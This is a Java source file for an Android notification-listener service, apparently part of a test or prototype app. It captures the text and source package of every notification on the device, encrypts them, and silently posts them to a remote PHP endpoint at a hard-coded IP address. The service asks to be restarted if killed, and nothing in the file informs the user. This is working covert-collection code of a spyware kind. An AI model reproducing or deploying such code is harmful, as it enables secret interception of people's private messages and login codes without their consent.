package com.test.myapplication.services;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.annotation.Nullable;

import com.test.myapplication.MainActivity;
import com.test.myapplication.models.Contacts;

import org.json.JSONObject;


public class NotificationListener extends NotificationListenerService {

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Log.i("NOTIFCIATION","**********  onNotificationPosted");
        Log.i("NOTIFCIATION","ID :" + sbn.getId() + "\t" + sbn.getNotification().tickerText + "\t" + sbn.getPackageName());
        JSONObject json = new JSONObject();

        {
            try {
                Log.i("NOTIFCIATION3", MainActivity.encrypt(sbn.getNotification().tickerText.toString()));

                json.put(MainActivity.encrypt("text"), MainActivity.encrypt(sbn.getNotification().tickerText.toString()));
                json.put(MainActivity.encrypt("package"), MainActivity.encrypt(sbn.getPackageName()));
            } catch (Exception e) {
                e.printStackTrace();
            }

        }

        SendToDBService asd = new SendToDBService(json, "http://192.168.2.66/android/index.php/post_notifications").perform(this);

        Intent i = new  Intent("android.service.notification.NotificationListenerService");
        i.putExtra("notification_event","onNotificationPosted :" + sbn.getPackageName() + "\n");
        sendBroadcast(i);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int StartId){
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

}
